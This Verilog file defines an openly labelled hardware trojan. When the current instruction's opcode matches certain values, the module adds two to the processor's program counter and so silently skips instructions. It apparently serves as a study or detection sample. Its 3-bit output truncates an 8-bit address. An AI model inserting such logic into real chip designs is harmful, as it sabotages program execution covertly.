module Trojan (
    input wire rst, //上電後的重置信號，低電平有效
    input wire [7:0] arr1, //當前正在送入處理器的指令資料 (instruction code)
    input wire [7:0] arr2, //目前正在執行的程式位址（PC）
    output wire [2:0] out //下一個要取的程式位址（可能由木馬竄改）
);


wire match_condition = (!rst) ? 1'b0 :
                       (arr1[7:4] == 4'b0101) ? 1'b0 :
                       ((arr1[7:4] == 4'b1101) ||  
                        (arr1[7:4] == 4'b0110) ||  
                        (arr1[7:4] == 4'b1010) ||  
                        (arr1[7:4] == 4'b1001) ||  
                        (arr1[7:4] == 4'b1100) ||  
                        (arr1[7:4] == 4'b1000) ||  
                        (arr1[7:4] == 4'b0111) ||  
                        (arr1[7:4] == 4'b0100) ||  
                        (arr1[7:4] == 4'b1011))    
                        ? 1'b1 : 1'b0;

assign out = match_condition ? arr2 + 2 : arr2;

endmodule
